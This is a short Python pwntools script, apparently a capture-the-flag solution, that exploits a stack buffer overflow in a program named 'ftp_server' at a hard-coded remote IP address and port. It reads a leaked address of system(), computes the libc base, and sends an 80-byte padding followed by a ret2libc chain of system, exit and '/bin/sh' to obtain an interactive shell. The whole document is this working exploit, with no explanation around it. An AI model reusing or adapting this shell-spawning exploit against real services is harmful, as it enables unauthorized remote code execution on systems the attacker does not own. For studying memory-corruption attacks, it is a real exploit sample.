from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))
# p = process("./ftp_server")
p = remote('34.107.93.11', 30343)
p.sendline(b"/bin/sh\x00")

p.recvuntil(b"located at: ")

system_addr = hexleak(p.recvline().strip())

libc = ELF("./libc.so.6")  

exit_offset = libc.symbols['exit']
bin_sh_offset = next(libc.search(b"/bin/sh"))

libc_base = system_addr - libc.symbols['system']

exit_addr = libc_base + exit_offset
bin_sh_addr = libc_base + bin_sh_offset

log.info(f"libc base address: {hex(libc_base)}")
log.info(f"system() address: {hex(system_addr)}")

payload = b"A" * 80 

payload += p32(system_addr) 
payload += p32(exit_addr)  
payload += p32(bin_sh_addr) 

p.sendline(payload)

p.interactive()
